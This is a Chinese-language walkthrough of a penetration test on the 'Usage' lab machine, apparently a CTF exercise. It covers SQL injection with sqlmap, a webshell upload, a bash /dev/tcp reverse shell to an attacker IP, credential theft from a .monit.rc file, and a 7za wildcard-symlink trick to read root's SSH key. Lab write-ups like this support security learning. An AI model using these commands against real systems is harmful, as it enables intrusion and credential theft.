# 记一次渗透测试实战之Usage-先知社区

> **来源**: https://xz.aliyun.com/news/16617  
> **文章ID**: 16617

---

# 信息收集

## 端口扫描

使用nmap进行端口探测。

![image.png](images/1736080866222-c42a096e-2276-4aea-99ba-38dde890b38d.png)

发现存在22和80端口开放。

![image.png](images/1736081342182-016fcd3d-dea7-44b4-a0af-d4921827d4bc.png)

## 子域名枚举

使用ffuf进行子域名枚举

![image.png](images/1736080976244-52880b3d-898a-4610-a0cd-73d688ed79a6.png)

未发现有用的东西。

![image.png](images/1736081643197-2a6c7d6f-6614-460f-948b-192a04bb2622.png)

## Web页面

访问web页面，发现存在一个登录地址。

![image.png](images/1736081397024-0a82cd13-414e-4de8-b6a8-29eb743aa46a.png)

发现存在登录地址。

![image.png](images/1736081494406-9aecb433-3d8b-4129-804b-b311905d3b71.png)

# web漏洞

## 弱口令漏洞

尝试使用弱口令进行登录尝试。

![image.png](images/1736081624055-e050d61e-0b93-46cd-af0e-b7f7354f5493.png)

发现存在注册按钮。

![image.png](images/1736082228594-22e83632-3ecb-4b9f-93a1-ce0c11993433.png)

注册一个用户，然后接着抓包看看。![image.png](images/1736082278958-7222e6bf-8cfc-42ee-97c0-bd87e188ff57.png)![image.png](images/1736082413862-3ea21fdb-6bfa-4cfb-b5e9-9eb1624c1a8f.png)

## SQL注入

抓包之后，尝试SQL注入。

![image.png](images/1736082491161-2912e95c-233b-452a-869b-b520494f50a2.png)

发现存在sql注入。

![image.png](images/1736082566696-67b8c34b-d180-4b7c-8e0a-1b966cb31b62.png)

## SQLmap枚举

使用sqlmap进行枚举。![image.png](images/1736082627725-6b91b8c6-df45-43b0-8d8f-f9a116ff2646.png)

没用跑出来，接着修改参数继续跑。

![image.png](images/1736082708949-90a8c0b9-fb2e-4575-b57e-ed3a47d2ed36.png)

成功跑出注入点。

![image.png](images/1736085330656-bb5242d6-c902-407a-9c6d-a2c8d29df01b.png)

尝试读表和用户。

![image.png](images/1736086639339-30d23d99-3e06-40f6-b60a-635101f6fff3.png)

![image.png](images/1736086621336-6e1f465c-5cf0-4ba9-9606-6fecbc16105a.png)

成功读出用户的用户名和hash。

![image.png](images/1736087489768-f24ddda1-8798-4da6-94e4-40d41000f631.png)

## Hash破解

解密之后登录。

![image.png](images/1736083084478-2cd0df75-88ef-40e3-bfd9-7d841ae1c706.png)

## CVE-2023-24249

![image.png](images/1737644978059-2ef84d35-4476-469a-b50a-378854e16b30.png)

成功登录。密码为：whatever1

![image.png](images/1736083173574-11099523-211b-4792-aa81-e4692a83844d.png)

测试功能点，发现有一处文件上次处。

![image.png](images/1736083790098-57b5a6a3-3d14-4d4c-a572-9462d384897a.png)

尝试上传图片马，访问之后没解析。

![image.png](images/1736083861715-ff44d755-11f5-4fb4-b2a0-dc00dd14254e.png)

接着重新上传，修改后缀名。![image.png](images/1736084114451-16c14f87-c0e7-4fc5-8e3d-debe069cbe0f.png)

## 获取shell

成功获取shell

![image.png](images/1736084248238-54cc24fb-126c-407a-b2d4-d81fe04c8e06.png)

## 反弹shell

接着进行反弹shell

bash -c 'bash -i >%26 /dev/tcp/10.10.16.33/443 0>%261'.![image.png](images/1736084343127-54423291-21f5-4418-9778-f784bdf91fb9.png)

成功获取user.txt![image.png](images/1736084396347-2cd2e58e-ad6a-4d5b-a95d-f52438084dd4.png)

升级shell权限。

![image.png](images/1736084437992-b470ddc9-42a7-4f14-b8d0-58791b94394c.png)

# 内网信息收集

收集敏感信息，发现在`.monit.rc`文件中，存在用户密码。

![image.png](images/1736084516726-3750facf-3139-4d42-aaf3-e70fe50b95ec.png)

## 切换用户

使用su切换用户。

![image.png](images/1736084583755-11f48dca-a9a4-4e20-b458-9673b416e7e0.png)

# 权限提升

发现`sudo`身份运行脚本，无需密码：

![image.png](images/1736084626737-adf4fc2a-61b6-4361-b75f-91c8d9e5a9d2.png)

## 文件分析

查看其文件属性

![image.png](images/1736084670599-e40894ff-3611-4dde-a975-c6a0b90aa9ff.png)发现它有一些选项，可以运行。

### image.png方法1：创建脚本读取文件

使用其创建一个脚本。

![image.png](images/1736084850198-6db57337-3b06-433c-acd0-f28c9df6e6bc.png)

运行之后，成功读取root.txt.

![image.png](images/1736085131514-6e7b0c1f-5318-4360-ac53-f3de08fd249f.png)

### 方法2：利用通配符漏洞读取ssh\_key

```
bash
7za a /backup/$filename.zip -t7z -snl -p$pass -- *
And you can create files in the folder were this is being executed, you could create the file @root.txt and the file root.txt being a symlink to the file you want to read:

bash

cd /path/to/7z/acting/folder
touch @root.txt
ln -s /file/you/want/to/read root.txt
```

发现通配符 ( `*`) 通常很危险。搜索“7za 通配符漏洞

![image.png](images/1736085251325-18a6869d-cee8-43a5-b97e-4502fefe8b59.png)

使用其来获取`/root/.ssh/id_rsa`，接着保存之后，使用ssh登录即可![image.png](images/1736085290573-b1c1701f-cca1-4fe3-a990-494197cc0c03.png)
